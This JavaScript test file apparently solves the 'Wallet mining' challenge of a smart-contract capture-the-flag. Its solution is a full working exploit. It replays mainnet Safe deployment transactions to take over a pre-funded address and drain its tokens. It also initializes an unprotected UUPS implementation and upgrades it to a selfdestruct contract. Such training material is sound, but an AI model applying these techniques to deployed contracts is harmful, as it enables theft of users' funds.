const { ethers, upgrades, deployments } = require('hardhat');
const { expect } = require('chai');
const { calculateProxyAddress } = require('@gnosis.pm/safe-contracts');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        const data = require("./data.json");
        console.log("Player address is", player.address)
        
        const attackWalletDeployer = walletDeployer.connect(player);
        const attackAuthorizer = authorizer.connect(player);

        // Transfer funds to deploying address
        const tx = {
            to: data.REPLAY_DEPLOY_ADDRESS,
            value: ethers.utils.parseEther("1")
        }
        await player.sendTransaction(tx);

        // Replay safe deploy transaction with same data from mainnet
        // Contract address will equal 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F
        // https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
        //  Nonce 0
        const deploySafeTx = await (await ethers.provider.sendTransaction(data.DEPLOY_SAFE_TX)).wait();
        const safeContractAddr = deploySafeTx.contractAddress;
        console.log("Replayed deploy Master Safe Copy at", safeContractAddr);

        // Do same thing but with nonce 1
        const randomTx = await (await ethers.provider.sendTransaction(data.RANDOM_TX)).wait();

        // Replay factory deploy transaction with same data from mainnet
        // Contract address will equal 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B 
        // https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
        // Nonce 2
        const deployFactoryTx = await (await ethers.provider.sendTransaction(data.DEPLOY_FACTORY_TX)).wait();
        const factoryContractAddr = deployFactoryTx.contractAddress;
        console.log("Replayed deploy safe factory at", factoryContractAddr);

        // Connect to proxy factory
        const proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", factoryContractAddr, player);

        // Helper function to create ABIs
        const createInterface = (signature, methodName, arguments) => {
            const ABI = signature;
            const IFace = new ethers.utils.Interface(ABI);
            const ABIData = IFace.encodeFunctionData(methodName, arguments);
            return ABIData;
        }


        const safeABI = ["function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)",
                        "function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes calldata signatures)",
                        "function getTransactionHash( address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce)"];
        const setupDummyABIData = createInterface(safeABI, "setup",  [
            [player.address],
            1,
            ethers.constants.AddressZero,
            0,
            ethers.constants.AddressZero,
            ethers.constants.AddressZero,
            0,
            ethers.constants.AddressZero,
        ])

        // Find how many addresses required to find the missing address of
        // 0x9b6fb606a9f5789444c17768c6dfcf2f83563801
        let nonceRequired = 0
        let address = ""
        while (address.toLowerCase() != DEPOSIT_ADDRESS.toLowerCase()) {
            address = ethers.utils.getContractAddress({
                from: factoryContractAddr,
                nonce: nonceRequired
            });
            nonceRequired += 1;
        }
        console.log(`Need to deploy ${nonceRequired} proxies to get access to 20mil`);

        for (let i = 0; i < nonceRequired ; i ++) {
            await proxyFactory.createProxy(safeContractAddr, setupDummyABIData);
        }

        // Create transfer interface for execTransaction
        const tokenABI = ["function transfer(address to, uint256 amount)"];
        const tokenABIData = createInterface(tokenABI, "transfer", [player.address, DEPOSIT_TOKEN_AMOUNT]);

        // Create an execTransaction that transfers all tokens back to the player
        
        // 1. need to get transaction hash from here https://github.com/safe-global/safe-contracts/blob/v1.1.1/contracts/GnosisSafe.sol#L398
        // 2. sign transaction hash
        // 3. Add 4 to v as per gnosis spec to show it is an eth_sign tx https://docs.gnosis-safe.io/learn/safe-tools/signatures
        // 3. Send it through exec transaction

        const depositAddrSafe = await ethers.getContractAt("GnosisSafe", DEPOSIT_ADDRESS, player);

        // Test that we are connected
        console.log("Version:", await depositAddrSafe.VERSION());
        
        // Params for the execTransaction
        const transactionParams = [
            token.address,
            0,
            tokenABIData,
            0,
            0,
            0,
            0,
            ethers.constants.AddressZero,
            ethers.constants.AddressZero,
            0
        ];

        // Get tx hash from generated from the contract
        const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);
        const signed = await player.signMessage(ethers.utils.arrayify(txhash));

        // Increase v by 4
        const signedIncreaseV = ethers.BigNumber.from(signed).add(4).toHexString();

        // Remove nonce from params and pass in params as well as signed hash
        await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signedIncreaseV);

        let bal = await token.balanceOf(player.address);
        console.log("Player balance = ", ethers.utils.formatEther(bal))
        // Part 1 of the exploit is complete!

        // Part 2: Bricking the implementation contract

        // Get the implementation address and initialise it
        // Implementation slot address is from EIP-1967 https://eips.ethereum.org/EIPS/eip-1967
        const impSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
        let implementationAddress = "0x" + (await ethers.provider.getStorageAt(attackAuthorizer.address, impSlot)).slice(-40);
        const impContract = await ethers.getContractAt("AuthorizerUpgradeable", implementationAddress, player);

        // Deploy attacking contract that has selfdestruct
        const attackContractFactory = await ethers.getContractFactory("AttackWalletMining", player);
        const attackContract = await attackContractFactory.deploy();

        // Create ABI to delegate call attacking contract
        const attackABI = ["function test()"];
        const IAttack = createInterface(attackABI, "test", []);

        // Init implementation contract to claim ownership of the contract
        // Upgrade to and call attacking contract, calling selfdestruct
        await impContract.init([], []);
        await impContract.upgradeToAndCall(attackContract.address, IAttack);

        await attackContract.printValues(attackAuthorizer.address, player.address, DEPOSIT_ADDRESS);

        // Deploy 43 Wallets through wallet deployer to retrieve all 
        // tokens in the contract
        for (let i = 0; i < 43; i ++) {
            await attackWalletDeployer.drop(setupDummyABIData);
        }

        bal = await token.balanceOf(player.address);
        console.log("Player balance = ", ethers.utils.formatEther(bal))
        // Part 2 complete!

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
